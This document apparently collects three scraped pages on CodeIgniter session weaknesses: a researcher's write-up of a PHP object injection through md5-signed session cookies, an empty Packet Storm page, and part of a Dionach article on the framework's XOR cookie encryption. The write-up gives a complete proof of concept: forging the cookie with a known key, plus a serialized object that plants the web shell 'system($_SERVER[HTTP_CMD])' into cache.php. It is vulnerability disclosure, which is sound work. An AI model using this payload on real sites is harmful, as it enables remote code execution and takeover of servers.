=== Content from www.mehmetince.net_93d4d0d8_20250126_131337.html ===

[Skip to content](#content "Skip to content")
[![Mehmet INCE | Information Security](https://www.mehmetince.net/wp-content/uploads/2016/04/logo450.png)](https://www.mehmetince.net/)

Menu

* [Ana Sayfa](https://www.mehmetince.net)
* [Siber Güvenlik](https://www.mehmetince.net/category/cyber-security/)
* [Linux & Open Source](https://www.mehmetince.net/category/linux/)
* [Konferanslar](https://www.mehmetince.net/category/konferans/)
* [CTF](https://www.mehmetince.net/category/ctf/)
* [Videolar](https://www.mehmetince.net/category/videos-talks/)
* [Research & Exploits](https://www.mehmetince.net/zafiyet-arastirmalari/)
* [Hakkımda](https://www.mehmetince.net/hakkimda/)

![](https://www.mehmetince.net/wp-content/uploads/2014/04/282_codeigniter-wallpaper-e1400594725794.jpg)
# Codeigniter Object Injection Vulnerability via Encryption Key

20/05/201418/04/2014 by [mehmet ince](https://www.mehmetince.net/author/mehmet-ince/ "View all posts by mehmet ince")

Codeigniter is one of my favorite PHP framework. Like every one else, I’ve learned PHP MVC programming with this framework. Today, I decided to analyze Codeigniter for PHP Object Injection Vulnerability.

I’ll focus on Session mechanism of Codeigniter at rest of this write-up . All method that I will explain are located in **CodeIgniter/system/libraries/Session.php**file. Also I used Codeigniter 2.1 stable release for this research.

### Codeigniter Session Mechanism

CI use serialization methods of PHP to store variables in user session. But Codeigniter session mechanism is not working like we expect. It stores session variables in client’s cookie. We expect that Codeigniter stores session variables at server side, mostly on disk instead of user cookie. I don’t know why developers decided to this way.

Following description grabbed from codeigniter documentation.

> The Session class stores session information for each user as serialized (and optionally encrypted) data in a cookie. Even if you are not using encrypted sessions, you must set an [encryption key](http://ellislab.com/codeigniter/user-guide/libraries/encryption.html) in your config file which is used to aid in preventing session data manipulation.

In this write-up we will analyze the possibilities of session data manipulation and so on.

### Codeigniter Session Data Structers

Let’s start read some codes. But before go further let me explain how Codeigniter creates sessions and put variables into the session -actually cookie!-

I will use CI shortcut instead of Codeigniter at rest of the write-up by the way.

Lets start to review codes with construct method of Session class. Following codes are a part of \_\_construct method.

```
// Run the Session routine. If a session doesn't exist we'll
// create a new one.  If it does, we'll update it.
if ( ! $this->sess_read())
{
    $this->sess_create();
}
else
{
    $this->sess_update();
}

// Delete 'old' flashdata (from last request)
$this->_flashdata_sweep();

// Mark all new flashdata as old (data will be deleted before next request)
$this->_flashdata_mark();

// Delete expired sessions if necessary
$this->_sess_gc();

log_message('debug', "Session routines successfully run");
```

CI try to read value from current client’s cookie. If it fails then it created new one. Let assume we dont have any cookie right now. So CI going to call **sess\_create** function. Following codes belongs to sess\_create function which is one of the Session class’s methods.

```
function sess_create()
{
    $sessid = '';
    while (strlen($sessid) < 32)
    {
        $sessid .= mt_rand(0, mt_getrandmax());
    }

    // To make the session ID even more secure we'll combine it with the user's IP
    $sessid .= $this->CI->input->ip_address();

    $this->userdata = array(
                        'session_id'	=> md5(uniqid($sessid, TRUE)),
                        'ip_address'	=> $this->CI->input->ip_address(),
                        'user_agent'	=> substr($this->CI->input->user_agent(), 0, 120),
                        'last_activity'	=> $this->now,
                        'user_data'		=> ''
                        );

    // Save the data to the DB if needed
    if ($this->sess_use_database === TRUE)
    {
        $this->CI->db->query($this->CI->db->insert_string($this->sess_table_name, $this->userdata));
    }

    // Write the cookie
    $this->_set_cookie();
}
```

**sess\_create** responsible for create session variables and set them to the user. As you see, it create array in order to store session id, ip address, user-agent etc  in session. When userdata array ready, it calls **\_set\_cookie()** which is another Session class function. Now it’s time to analyze \_set\_cookie function’s codes.

```
function _set_cookie($cookie_data = NULL)
{
    if (is_null($cookie_data))
    {
        $cookie_data = $this->userdata;
    }

    // Serialize the userdata for the cookie
    $cookie_data = $this->_serialize($cookie_data);

    if ($this->sess_encrypt_cookie == TRUE)
    {
        $cookie_data = $this->CI->encrypt->encode($cookie_data);
    }
    else
    {
        // if encryption is not used, we provide an md5 hash to prevent userside tampering
        $cookie_data = $cookie_data.md5($cookie_data.$this->encryption_key);
    }

    $expire = ($this->sess_expire_on_close === TRUE) ? 0 : $this->sess_expiration + time();

    // Set the cookie
    setcookie(
                $this->sess_cookie_name,
                $cookie_data,
                $expire,
                $this->cookie_path,
                $this->cookie_domain,
                $this->cookie_secure
            );
}
```

There is one description about code.

> // if encryption is not used, we provide an md5 hash to prevent userside tampering

CI uses md5 for encrypt serialized session data. It use **encryption\_key** for salt. Then adds result of the md5 encryption to end of the $cookie\_data.

```
//
//
$cookie_data = $cookie_data.md5($cookie_data.$this->encryption_key);
```

I want to explain the above code. **$cookie\_data** is going to send to the client. It contains ip\_address, user-agent etc. CI use encryption\_key as a salt key. As an attacker we know **$cookie\_data** and result of the md5 encryption. Because CI add result of the md5 calculation to end of the **$cookie\_data** then sends it to us -attacker. Let me show real data.

```
ci_session=a:5:{s:10:"session_id";s:32:"e4f2a5e86d65ef070f5874f07c33b043";s:10:"ip_address";s:9:"127.0.0.1";s:10:"user_agent";s:76:"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:28.0)+Gecko/20100101+Firefox/28.0";s:13:"last_activity";i:1397754060;s:9:"user_data";s:0:"";}550d610647f0ee0d019357d84f3b0488

```

You see **ci\_session**variables at above. It’s cookie variable and end of the value you will see **550d610647f0ee0d019357d84f3b0488 .**It’s result of md5! If we try to reverse that;

**Value of $cookie\_data variables =**a:5:{s:10:”session\_id”;s:32:”e4f2a5e86d65ef070f5874f07c33b043″;s:10:”ip\_address”;s:9:”127.0.0.1″;s:10:”user\_agent”;s:76:”Mozilla/5.0+(X11;+Ubuntu;+Linux+x86\_64;+rv:28.0)+Gecko/20100101+Firefox/28.0″;s:13:”last\_activity”;i:1397754060;s:9:”user\_data”;s:0:””;}

**$this->encryption\_key =**is what we are trying to get!

**Result of md5 calculation =** 550d610647f0ee0d019357d84f3b0488

Obviously we can use brute force attack in order to detect salt.I mean encryption key.

For example ; let assume following defination.

**$this->encryption\_key = WE DONT NOW!**

**Value of $cookie\_data variables  =**a:1:{s:4:”test”;i:1;}adf8a852dafaf46f8c8038256fd0963a

```
//
adf8a852dafaf46f8c8038256fd0963a = md5('a:1:{s:4:"test";i:1;}'.$this->encryption_key)
```

You can use brute force techniques in order to detect encryption\_key!  In order to brute force this md5,, you can think **encryption\_key** as plain text that you want to reach, so **Value of $cookie\_data variables becomes**a salt. And ofcourse reverse md5 prototype **md5(plain-text, SALT)** to **md5(SALT,plain-text)**.

This is demonstration.We will have too long $cookie\_data in real life example. As I mentioned before, $cookie\_data becomes salt in order to brute force md5. Unfortunately HashCat does not support for this kind of salt key.

### Codeigniter Session Data Integrity and Verification

We learned how CI create cookie data. Now we will have analyze CI’S cookie data verification system. As I assumed before, we didn’t have a cookie. This time we have a cookie in our HTTP request. Let’s see how CI checks it and verify it. In order to do that, we need to understand codes of **sess\_read()**method of Session class.

Remember \_construct method of Session class. It try to read cookie from client with **sess\_read**method. This is the reason why we will analyze sess\_read method.

```
function sess_read()
    {
    // Fetch the cookie
    $session = $this->CI->input->cookie($this->sess_cookie_name);

    // No cookie?  Goodbye cruel world!...
    if ($session === FALSE)
    {
        log_message('debug', 'A session cookie was not found.');
        return FALSE;
    }
    // Decrypt the cookie data
    if ($this->sess_encrypt_cookie == TRUE)
    {
        $session = $this->CI->encrypt->decode($session);
    }
    else
    {
        // encryption was not used, so we need to check the md5 hash
        $hash	 = substr($session, strlen($session)-32); // get last 32 chars
        $session = substr($session, 0, strlen($session)-32);

        // Does the md5 hash match?  This is to prevent manipulation of session data in userspace
        if ($hash !==  md5($session.$this->encryption_key))
        {
            log_message('error', 'The session cookie data did not match what was expected. This could be a possible hacking attempt.');
            $this->sess_destroy();
            return FALSE;
        }
    }
    // Unserialize the session array
    $session = $this->_unserialize($session);

    // Is the session data we unserialized an array with the correct format?
    if ( ! is_array($session) OR ! isset($session['session_id']) OR ! isset($session['ip_address']) OR ! isset($session['user_agent']) OR ! isset($session['last_activity']))
    {
        $this->sess_destroy();
        return FALSE;
    }
    // Is the session current?
    if (($session['last_activity'] + $this->sess_expiration) < $this->now)
    {
        $this->sess_destroy();
        return FALSE;
    }

    // Does the IP Match?
    if ($this->sess_match_ip == TRUE AND $session['ip_address'] != $this->CI->input->ip_address())
    {
        $this->sess_destroy();
        return FALSE;
    }
    // Does the User Agent Match?
    if ($this->sess_match_useragent == TRUE AND trim($session['user_agent']) != trim(substr($this->CI->input->user_agent(), 0, 120)))
    {
        $this->sess_destroy();
        return FALSE;
    }

    // Is there a corresponding session in the DB?
    if ($this->sess_use_database === TRUE)
    {
        $this->CI->db->where('session_id', $session['session_id']);

        if ($this->sess_match_ip == TRUE)
        {
            $this->CI->db->where('ip_address', $session['ip_address']);
        }

        if ($this->sess_match_useragent == TRUE)
        {
            $this->CI->db->where('user_agent', $session['user_agent']);
        }

        $query = $this->CI->db->get($this->sess_table_name);

        // No result?  Kill it!
        if ($query->num_rows() == 0)
        {
            $this->sess_destroy();
            return FALSE;
        }

        // Is there custom data?  If so, add it to the main session array
        $row = $query->row();
        if (isset($row->user_data) AND $row->user_data != '')
        {
            $custom_data = $this->_unserialize($row->user_data);

            if (is_array($custom_data))
            {
                foreach ($custom_data as $key => $val)
                {
                    $session[$key] = $val;
                }
            }
        }
    }
    // Session is valid!
    $this->userdata = $session;
    unset($session);
    return TRUE;
}
```

Line 4 = Get cookie from client.

Line 7 = Check returned value. If it is false, that means client don’t have cookie!

Line 13 = If encryption is enabled. *-In write-up case it’s not!-*

Line 20 = Strip out hash from cookie. *-Remember my previous explanation. CI addes md5 hash end of the session data –*

Line 21 = Strip out session data from cookie.

Line 24 = Md5 calculation in order to check data integrity.

> Does the md5 hash match? This is to prevent manipulation of session data in userspace

Line 32 = Call \_unserialize method of Session data! **-Now we can think about Object Injection Vulnerability.-**

Rest of the code CI check session variables and user-agents. Basically CI want to see same user-agent and ip address. As we analyzed **sess\_write** method CI writes those variables into the session.

Lets analyze **\_unserialize** method’s codes.

```
function _unserialize($data)
{
    $data = @unserialize(strip_slashes($data));

    if (is_array($data))
    {
        foreach ($data as $key => $val)
        {
            if (is_string($val))
            {
                $data[$key] = str_replace('{{slash}}', '\\', $val);
            }
        }

        return $data;
    }

    return (is_string($data)) ? str_replace('{{slash}}', '\\', $data) : $data;
}
```

Yes! It calls unserialize method with  user supplied data which is client’s Cookie in this case.

### RECAP

Before go to the exploitation part, I want to recap what we learned until now.

1. CI use serialize and unserialize method in order to store variables in Session.
2. CI don’t use real Session dialectic. CI stores session variables in Client-site (cookie) instead of Server-Site (hard-dirve..)
3. CI do md5 calculation in order to detect user site tampering.
4. Checks user-agent and ip address are same with session data.
5. Call unserialize method.

### IN CONCLUSION

We have some obstacles.

* CI doesn’t use destruct or wakeup methods…
* Codeigniter loads libraries by **$autoload[‘libraries’]** variable. If Session class defined in first place in that array, you can NOT reach rest of the classes. Because we are exploiting Session and CI initialize Session class before user land libraries.

Let me clarify it. CI going to create objects from classes by order. That means classes which located in **system/core**file path will create first. Then CI going to look **$autoload[‘libraries’]** array and create object by order again. So, location of the session class initialization is too much important in order to reach different classes.

I wrote vulnerable codeigniter application to use it as an example. Following expression is related with that application.

<https://github.com/mmetince/codeigniter-object-inj>

Now we can use weakness of session integrity check and unserialize method together.

As you figure out, we need to know encryption\_key to use that vulnerabilities for evil! There is two method for that.

1 – Like I explained before, use weakness of md5 and failed design of CI’s session data integrity together. Brute force it! *I suggest you do that when you believe encryption\_key is not too long.*

2 – A lot of developer usually push their application to github without change encryption\_key. And people who use one of that application usually don’t change encryption\_keys.

We already know the encryption\_key which is **h4ck3rk3y** in this case. Let’s start!

**http://localhost:8080/index.php/welcome**

When I call the above URL, it returned following HTTP response to me.

```
HTTP/1.1 200 OK
Host: localhost:8080
Connection: close
X-Powered-By: PHP/5.5.3-1ubuntu2.3
Set-Cookie: ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22b4febcc23c1ceebfcae0a12471af8d72%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A76%3A%22Mozilla%2F5.0+%28X11%3B+Ubuntu%3B+Linux+x86_64%3B+rv%3A28.0%29+Gecko%2F20100101+Firefox%2F28.0%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1397759422%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D30f9db14538d353e98dd00d41d84d904; expires=Thu, 17-Apr-2014 20:30:22 GMT; Max-Age=7200; path=/
Content-Type: text/html

```

We see Set-Cookie http header variable. Let analyze it

```
ci_session=a:5:{s:10:"session_id";s:32:"b4febcc23c1ceebfcae0a12471af8d72";s:10:"ip_address";s:9:"127.0.0.1";s:10:"user_agent";s:76:"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:28.0)+Gecko/20100101+Firefox/28.0";s:13:"last_activity";i:1397759422;s:9:"user_data";s:0:"";}30f9db14538d353e98dd00d41d84d904; expires=Thu, 17-Apr-2014 20:30:22 GMT; Max-Age=7200; path=/

```

You see Expires dates and Max-Age at end of the string.They are not important for now. Let strip them out.

```
ci_session=a:5:{s:10:"session_id";s:32:"b4febcc23c1ceebfcae0a12471af8d72";s:10:"ip_address";s:9:"127.0.0.1";s:10:"user_agent";s:76:"Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:28.0)+Gecko/20100101+Firefox/28.0";s:13:"last_activity";i:1397759422;s:9:"user_data";s:0:"";}30f9db14538d353e98dd00d41d84d904
```

Now we will seperate md5 and cookie from that string  like CI do.

**md5 =** 30f9db14538d353e98dd00d41d84d904

**Session data=**a:5:{s:10:”session\_id”;s:32:”b4febcc23c1ceebfcae0a12471af8d72″;s:10:”ip\_address”;s:9:”127.0.0.1″;s:10:”user\_agent”;s:76:”Mozilla/5.0+(X11;+Ubuntu;+Linux+x86\_64;+rv:28.0)+Gecko/20100101+Firefox/28.0″;s:13:”last\_activity”;i:1397759422;s:9:”user\_data”;s:0:””;}

We have learned that CI puts user-agent into the session data as you can see above. Actually session data string is a PHP array.

```
Array
(
    [session_id] => b4febcc23c1ceebfcae0a12471af8d72
    [ip_address] => 127.0.0.1
    [user_agent] => Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:28.0)+Gecko/20100101+Firefox/28.0
    [last_activity] => 1397759422
    [user_data] =>
)

```

We know CI going to check ip address and user-agents after unserialize it. But already done with Object Injection before that controls. We can change it to whatever we want!

Now it’s time to create our object in order to exploitclass. Following class can be found under **application/libraries**in our example.

```
<?php
/**
 * Created by PhpStorm.
 * User: mince
 * Date: 4/18/14
 * Time: 3:34 PM
 */
if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Customcacheclass {

    var $dir = '';
    var $value = '';
    public function __construct()
    {
        $this->dir = dirname(__FILE__)."/cache_dir/";
    }

    public function set_value($v){
        $this->value = $v;
    }

    public function get_value(){
        return $this->value;
    }
    public function __destruct(){
        file_put_contents($this->dir."cache.php", $this->value, FILE_APPEND);
    }
}

```

You see \_\_destruct method save class variable into the **cache.php** file. Serialized form of Cacheclass going to be like following string.

```
//
O:10:"Cacheclass":2:{s:3:"dir";s:15:"/tmp/cache_dir/";s:5:"value";s:3:"NUL";}
```

We will change it to like following one in order to write eval codes into to cache.php file.

```
//
<?php
class Customcacheclass {

    var $dir = 'application/libraries/cache_dir/';
    var $value = '<?php system($_SERVER[HTTP_CMD]);?>';
}
echo serialize(new Customcacheclass);

// Result
O:16:"Customcacheclass":2:{s:3:"dir";s:32:"application/libraries/cache_dir/";s:5:"value";s:35:"<?php system($_SERVER[HTTP_CMD]);?>";}
```

Now we need to calculate true md5 value for malformed session data in order to pass integrity control of **sess\_read** method.

```
<?php

$b = 'O:16:"Customcacheclass":2:{s:3:"dir";s:32:"application/libraries/cache_dir/";s:5:"value";s:35:"<?php system($_SERVER[HTTP_CMD]);?>";}';
$private_key = 'h4ck3rk3y';

echo md5($b.$private_key);
echo "\n";
```

And result is **fc47e410df55722003c443cefbe1b779.**We will add this md5 end of the our new Cookie value.

```
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0
Referer: http://localhost/
Cookie: ci_session=O%3A16%3A%22Customcacheclass%22%3A2%3A%7Bs%3A3%3A%22dir%22%3Bs%3A32%3A%22application%2flibraries%2fcache_dir%2f%22%3Bs%3A5%3A%22value%22%3Bs%3A35%3A%22%3C%3Fphp%20system%28%24_SERVER%5BHTTP_CMD%5D%29%3B%3F%3E%22%3B%7Dfc47e410df55722003c443cefbe1b779

```

When you send above http request to the CI you will see the following codes in content of cache.php

```
//
<?php system($_SERVER[HTTP_CMD]);?>
```

Categories [Application Security](https://www.mehmetince.net/category/cyber-security/web-uygulama-guvenligi/) Tags [codeigniter](https://www.mehmetince.net/tag/codeigniter/), [kaynak kod](https://www.mehmetince.net/tag/kaynak-kod/), [php](https://www.mehmetince.net/tag/php/)
[Bluethrust Remote Code Execution Vulnerability & Exploitation](https://www.mehmetince.net/bluethrustclanscript-remote-code-execution-exploit/)[PyroCMS Object Injection Vulnerability – Another step, damn the steps, damn thee!](https://www.mehmetince.net/pyrocms-object-injection-vulnerability-another-step-damn-thee-steps-damn-thee/)

 [![](https://www.mehmetince.net/wp-content/uploads/2016/11/photo.jpg)](/hakkimda/)

## Son Yazılar

* [PCI/DSS ile Payment Gateway’ler Arasındaki HTTP Security Headers Tartışmaları](https://www.mehmetince.net/pci-dss-ile-payment-gatewayler-arasindaki-http-security-headers-tartismalari/)
* [Siber Güvenlik alanında kendimi nasıl geliştirebilirim ? Nereden başlamalıyım ?](https://www.mehmetince.net/siber-guvenlik-alaninda-kendimi-nasil-gelistirebilirim-nereden-baslamaliyim/)
* [Hangi VPN Firmasını Kullanmalı ? Neden NordVPN kullanmaya başladım ?](https://www.mehmetince.net/hangi-vpn-firmasini-kullanmali-neden-nordvpn-kullanmaya-basladim/)
* [Yeni Blog Adresi pentest.blog Yayında](https://www.mehmetince.net/yeni-blog-adresi-pentestblog-yayinda/)
* [Yük Dengeleyiciler ve Gerçek IP Adresi Karmaşası](https://www.mehmetince.net/yuk-dengeleyiciler-ve-gercek-ip-adresi-karmasasi/)
## Kategoriler

* [Application Security](https://www.mehmetince.net/category/cyber-security/web-uygulama-guvenligi/)
* [CTF](https://www.mehmetince.net/category/ctf/)
* [Database Security](https://www.mehmetince.net/category/cyber-security/database-attacks-security/)
* [Haberler](https://www.mehmetince.net/category/haberler/)
* [Konferanslar](https://www.mehmetince.net/category/konferans/)
* [Linux & Open Source](https://www.mehmetince.net/category/linux/)
* [Penetration Test](https://www.mehmetince.net/category/cyber-security/penetration-test/)
* [Siber Güvenlik](https://www.mehmetince.net/category/cyber-security/)
* [Son yazılar](https://www.mehmetince.net/category/genel/)
* [Videos & Talks](https://www.mehmetince.net/category/videos-talks/)

## Güvenlik Mail Listesi

## Facebook Grup

> [MDISec - Siber Güvenlik Blog](https://www.facebook.com/siberguvenlikblog/)

## Sponsor

Bu blog **Netinternet Firması** tarafından sağlanan sunucu sponsorluğu ile yürütülmektedir. [Devamı](https://www.mehmetince.net/hakkimda/)

© 2025 Mehmet INCE | Information Security • Built with [GeneratePress](https://generatepress.com)



=== Content from packetstormsecurity.com_265bfbc5_20250126_004958.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.dionach.com_f690518e_20250126_131337.html ===


[Skip to content](#content "Skip to content")
[![Clickcease](https://monitor.clickcease.com/stats/stats.aspx)](https://www.clickcease.com)

* ![English UK](data:image/svg+xml...)![English UK](https://www.dionach.com/wp-content/uploads/flags/flag-uk.png)
  + [![English US](data:image/svg+xml...)![English US](https://www.dionach.com/wp-content/uploads/flags/flag-us.png)](https://www.dionach.com/en-us/codeigniter-session-decoding-vulnerability/)
  + [![English AU](data:image/svg+xml...)![English AU](https://www.dionach.com/wp-content/uploads/flags/Au-Flag.png)](https://www.dionach.com/en-au/codeigniter-session-decoding-vulnerability/)

[![Dionach](data:image/gif;base64... "Dionach")![Dionach](data:image/gif;base64... "Dionach")![Dionach](https://www.dionach.com/wp-content/uploads/2025/01/Dionach-no-strapline-col-nomios.png "Dionach")](https://www.dionach.com)

* [Home](https://www.dionach.com/)
* [Company](https://www.dionach.com/about-us/)
* [Services](/services/)
  + [Assurance](/services/assurance/)
    - [Red Team Security Assessment](/services/assurance/red-team-security-assessment/)
      * [Assumed Breach Assessment](https://www.dionach.com/services/assurance/assumed-breach-assessment/)
    - [Purple Teaming](https://www.dionach.com/services/assurance/purple-teaming/)
    - [Penetration Testing](/services/assurance/penetration-testing/)
    - [AI Application Penetration Testing](https://www.dionach.com/services/assurance/ai-application-penetration-testing/)
    - [Cloud Security Assessment](https://www.dionach.com/services/assurance/cloud-security-assessment/)
    - [Social Engineering](https://www.dionach.com/services/assurance/social-engineering/)
    - [OT / ICS / Scada Testing](/services/assurance/scada-testing/)
    - [Consultancy](/services/assurance/consultancy/)
    - [Security Auditing](/services/assurance/security-auditing/)
    - [Ransomware Readiness](/services/assurance/ransomware-readiness/)
  + [Compliance](/services/compliance/)
    - [PCI DSS](/services/compliance/pci-dss/)
    - [ISO 27001](/services/compliance/iso-27001/)
    - [ISO 22301](/services/compliance/iso-22301/)
    - [Digital Operational Resilience Act (DORA)](https://www.dionach.com/services/compliance/digital-operational-resilience-act-dora/)
    - [Data Protection](https://www.dionach.com/services/compliance/data-protection/)
    - [Virtual CISO](https://www.dionach.com/services/compliance/virtual-ciso/)
    - [CAA Assure Audits](https://www.dionach.com/services/compliance/caa-assure-audits/)
    - [Swift Auditing](/services/compliance/swift-auditing/)
    - [Cyber Essentials](/services/compliance/cyber-essentials-2/)
  + [Response](/services/response/)
    - [Cyber Security Incident Response](/services/response/cyber-security-incident-response/)
  + [Healthcare](https://www.dionach.com/services/healthcare/)
    - [Cyber Assurance Service](https://www.dionach.com/services/healthcare/cyber-assurance-service/)
    - [Data Security Protection Toolkit](https://www.dionach.com/services/healthcare/data-security-protection-toolkit-dspt/)
    - [Cyber Risk Framework Workshop](https://www.dionach.com/services/healthcare/cyber-risk-framework-workshop/)
* [Industries](https://www.dionach.com/industries/)
  + [Aviation](https://www.dionach.com/industries/aviation/)
  + [Education](https://www.dionach.com/industries/education/)
  + [Energy & Utilities](https://www.dionach.com/industries/energy-utilities/)
  + [Finance](https://www.dionach.com/industries/finance/)
  + [Healthcare](https://www.dionach.com/industries/healthcare-sector/)
  + [Oil & Gas](https://www.dionach.com/industries/oil-and-gas/)
  + [Retail](https://www.dionach.com/industries/retail/)
  + [Technology](https://www.dionach.com/industries/technology/)
* [Research](https://www.dionach.com/research/)
* [Resources](https://www.dionach.com/resources/)
* [Careers](/careers/)
* [Contact](/contact/)

[![Dionach](data:image/gif;base64... "Dionach")![Dionach](data:image/gif;base64... "Dionach")![Dionach](https://www.dionach.com/wp-content/uploads/2025/01/Dionach-no-strapline-col-nomios.png "Dionach")](https://www.dionach.com)

Menu Toggle

* [Home](https://www.dionach.com/)
* [Company](https://www.dionach.com/about-us/)
* [Services](/services/)Menu Toggle
  + [Assurance](/services/assurance/)Menu Toggle
    - [Red Team Security Assessment](/services/assurance/red-team-security-assessment/)Menu Toggle
      * [Assumed Breach Assessment](https://www.dionach.com/services/assurance/assumed-breach-assessment/)
    - [Purple Teaming](https://www.dionach.com/services/assurance/purple-teaming/)
    - [Penetration Testing](/services/assurance/penetration-testing/)
    - [AI Application Penetration Testing](https://www.dionach.com/services/assurance/ai-application-penetration-testing/)
    - [Cloud Security Assessment](https://www.dionach.com/services/assurance/cloud-security-assessment/)
    - [Social Engineering](https://www.dionach.com/services/assurance/social-engineering/)
    - [OT / ICS / Scada Testing](/services/assurance/scada-testing/)
    - [Consultancy](/services/assurance/consultancy/)
    - [Security Auditing](/services/assurance/security-auditing/)
    - [Ransomware Readiness](/services/assurance/ransomware-readiness/)
  + [Compliance](/services/compliance/)Menu Toggle
    - [PCI DSS](/services/compliance/pci-dss/)
    - [ISO 27001](/services/compliance/iso-27001/)
    - [ISO 22301](/services/compliance/iso-22301/)
    - [Digital Operational Resilience Act (DORA)](https://www.dionach.com/services/compliance/digital-operational-resilience-act-dora/)
    - [Data Protection](https://www.dionach.com/services/compliance/data-protection/)
    - [Virtual CISO](https://www.dionach.com/services/compliance/virtual-ciso/)
    - [CAA Assure Audits](https://www.dionach.com/services/compliance/caa-assure-audits/)
    - [Swift Auditing](/services/compliance/swift-auditing/)
    - [Cyber Essentials](/services/compliance/cyber-essentials-2/)
  + [Response](/services/response/)Menu Toggle
    - [Cyber Security Incident Response](/services/response/cyber-security-incident-response/)
  + [Healthcare](https://www.dionach.com/services/healthcare/)Menu Toggle
    - [Cyber Assurance Service](https://www.dionach.com/services/healthcare/cyber-assurance-service/)
    - [Data Security Protection Toolkit](https://www.dionach.com/services/healthcare/data-security-protection-toolkit-dspt/)
    - [Cyber Risk Framework Workshop](https://www.dionach.com/services/healthcare/cyber-risk-framework-workshop/)
* [Industries](https://www.dionach.com/industries/)Menu Toggle
  + [Aviation](https://www.dionach.com/industries/aviation/)
  + [Education](https://www.dionach.com/industries/education/)
  + [Energy & Utilities](https://www.dionach.com/industries/energy-utilities/)
  + [Finance](https://www.dionach.com/industries/finance/)
  + [Healthcare](https://www.dionach.com/industries/healthcare-sector/)
  + [Oil & Gas](https://www.dionach.com/industries/oil-and-gas/)
  + [Retail](https://www.dionach.com/industries/retail/)
  + [Technology](https://www.dionach.com/industries/technology/)
* [Research](https://www.dionach.com/research/)
* [Resources](https://www.dionach.com/resources/)
* [Careers](/careers/)
* [Contact](/contact/)

# CodeIgniter Session Decoding Vulnerability

When building a new PHP web application, most developers will choose to base it on an existing framework, rather than building it from the ground up themselves. Frameworks have a number of benefits, such as decreasing the time required to develop an application, making it easier to use modern design patterns such as MVC, and providing a large number of helper functions and classes to the developer. The use of frameworks can also increase the security of an application, as the framework can handle things like automatically adding CSRF tokens to forms, encoding output before displaying it, or pushing the developer to safe functions to access the database rather than building their raw queries. Frameworks can also take care of areas such as session handling and access control – where developer mistakes frequently lead to vulnerabilities.

However, basing your application on a third party framework introduces a number of problems. The framework code needs to be kept up to date, which is often difficult as updates may be disruptive or break application functionality. Frameworks may also become unsupported, leaving the developer with the options of migrating the entire application to a new framework or running unsupported code and hoping for the best. And finally, frameworks may introduce serious security vulnerabilities into the applications developed with them. Frameworks are an attractive target for attackers, as a single vulnerability could allow them to exploit a number of off-the-shelf products developed in the framework, as well as any bespoke sites using it.

## CodeIgniter

CodeIgniter is one of the older PHP frameworks, first released in 2006. It’s still widely used, although recently it seems to be losing popularity to newer frameworks like Laravel and Phalcon. CodeIgniter has its own session handling code that is rather different from other frameworks. Rather than just storing a session ID in the cookie, it stores a serialized PHP array containing the session ID, UserAgent and IP address of the visitor, and a “last activity” timestamp. When the user requests a page, this session cookie is checked, the array is unserialized and if the UserAgent or IP doesn’t match, the session will be destroyed. To prevent the user from tampering with the session variables, or performing a PHP object injection attack through the cookie, a checksum is appended to the end of the array. This checksum is a hash of the array and a secret application specific key – if this checksum is invalid the session cookie is discarded. A timing attack was [recently published](https://seclists.org/fulldisclosure/2014/May/54) against this protection based on the fact that PHP’s strcmp() function doesn’t return in constant time, allowing the hash to be brute-forced one character at a time.

CodeIgniter also provides the option to encrypt the user’s session cookie, preventing the user from reading the cookie and removing the possibility of the above timing attack. If the PHP Mcrypt library is available, this encryption will be done using 256bit AES (note that [some weaknesses](https://github.com/EllisLab/CodeIgniter/issues/1702) have been identified in this encryption code). However, if the Mcrypt library isn’t available, then CodeIgniter silently falls back to using a custom, XOR based encryption scheme. And as the first rule of cryptography is “don’t roll your own”, the words “custom encryption scheme” are never a good sign.

#### Session Encryption

The session array is created, and then serialized. This string is then passed to the CI->encrypt->encode() method, which checks for the existence of Mcrypt, and if it’s not available calls the \_xor\_encode() method (shown below).

```
function _xor_encode($string, $key)
{
	$rand = '';
	while (strlen($rand) < 32)
	{
		$rand .= mt_rand(0, mt_getrandmax());
	}
	$rand = $this->hash($rand);
	$enc = '';
	for ($i = 0; $i < strlen($string); $i++)
	{
		$enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
	}
	return $this->_xor_merge($enc, $key);
}
```

This function generates a random string using the mt\_rand() function (which is not cryptographically secure, and has a number of known weaknesses) and hashes this string (using SHA-1 by default, but possibly MD5). It then creates a new string by alternating characters of this hashed key ($rand) with characters from the serialized array that have been XORed with the respective character. This string is then passed to the \_xor\_merge method().

```
function _xor_merge($string, $key)
{
	$hash = $this->hash($key);
	$str = '';
	for ($i = 0; $i < strlen($string); $i++)
	{
		$str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
	}
	return $str;
}

```

The application-defined key is hashed (default SHA-1, possibly MD5) and the input string is then XORed with this hash. The final output is then returned, base64 encoded and sent to the user in a cookie. This process is then reversed to read the cookie supplied by the user (with the \_xor\_decode() method).

#### Breaking the Encryption

